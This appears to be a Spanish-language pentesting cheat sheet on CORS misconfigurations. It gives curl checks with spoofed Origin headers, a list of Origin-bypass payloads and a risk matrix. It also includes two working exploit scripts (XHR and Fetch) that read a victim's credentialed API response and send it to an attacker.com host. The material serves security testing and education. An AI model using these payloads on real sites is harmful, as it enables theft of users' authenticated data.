# 🌍 Guía rápida de configuraciones incorrectas de CORS

<!-- language-home-navigation -->
[🏠 Página principal en español](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇮🇹 Versione Italiana](README.it.md) • [🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)


> **Precisiones del original:** Un origen combina esquema, host y puerto. CORS regula principalmente si el navegador permite leer la respuesta desde otro origen; no sustituye la autenticación ni evita por sí solo CSRF. Con credenciales, `Access-Control-Allow-Origin: *` impide al navegador conceder acceso a la respuesta. Las políticas de cookies de terceros y SameSite también influyen en el envío de credenciales ([MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS)). Los niveles de riesgo de la tabla son orientativos y dependen de los datos expuestos y de que el ataque funcione en un navegador. `curl -I` usa HEAD: una respuesta con determinadas cabeceras no demuestra por sí sola que una solicitud GET autenticada sea explotable. Los valores de cabeceras y payloads se conservan literalmente.


```
   ██████╗ ██████╗ ██████╗ ███████╗
  ██╔════╝██╔═══██╗██╔══██╗██╔════╝
  ██║     ██║   ██║██████╔╝███████╗
  ██║     ██║   ██║██╔══██╗╚════██║
  ╚██████╗╚██████╔╝██║  ██║███████║
   ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝
   Intercambio de recursos entre orígenes
```

---

## 🎯 Qué es CORS

**CORS** controla qué orígenes pueden acceder a los recursos. Las configuraciones incorrectas permiten a los atacantes robar datos sensibles desde otro origen.

---

## 🔍 Pruebas de CORS

### Prueba básica
```bash
curl -H "Origin: https://evil.com" -I https://target.com/api/user

# Comprobar las cabeceras de respuesta:
Access-Control-Allow-Origin: https://evil.com  # ¡Vulnerable!
Access-Control-Allow-Credentials: true         # ¡Especialmente peligroso!
```

### Payloads de prueba (cabecera Origin)
```
# Evasión de la coincidencia exacta
https://evil.com
https://target.com.evil.com
https://eviltarget.com
https://target.com%60.evil.com

# Origen null
null

# Subdominio
https://sub.target.com

# Cambio a un protocolo menos seguro
http://target.com
```

---

## 💉 Explotación

### Robar datos (con credenciales)
```html
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://vulnerable.com/api/user', true);
xhr.withCredentials = true;
xhr.onload = function() {
    // Enviar los datos al atacante
    fetch('https://attacker.com/log?data=' + btoa(xhr.responseText));
};
xhr.send();
</script>
```

### Versión con la API Fetch
```html
<script>
fetch('https://vulnerable.com/api/sensitive', {
    credentials: 'include'
})
.then(r => r.text())
.then(d => {
    fetch('https://attacker.com/?data=' + btoa(d));
});
</script>
```

---

## 📊 Matriz de vulnerabilidades

| Cabecera ACAO | ACAC | Riesgo |
|-------------|------|------|
| `*` | false | Bajo (sin credenciales) |
| `*` | true | Configuración no válida |
| Origen del atacante | true | **CRÍTICO** |
| null | true | **ALTO** |
| Origen reflejado | true | **CRÍTICO** |

### Patrones peligrosos
```http
# Refleja cualquier origen
Access-Control-Allow-Origin: [request origin]
Access-Control-Allow-Credentials: true

# Permite null
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

---

## 🛠️ Comprobaciones rápidas

```bash
# Automatización con curl
for origin in "https://evil.com" "null" "https://target.com.evil.com"; do
  echo "Testing: $origin"
  curl -sI -H "Origin: $origin" https://target.com/api | grep -i "access-control"
done
```

---

## 📚 Recursos

- [PortSwigger CORS](https://portswigger.net/web-security/cors)
- [Guía rápida de explotación de CORS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration)

---

<p align="center">
  <b>🌍 ¡Explota CORS!</b><br>
  <i>¡Solo para pruebas autorizadas!</i>
</p>
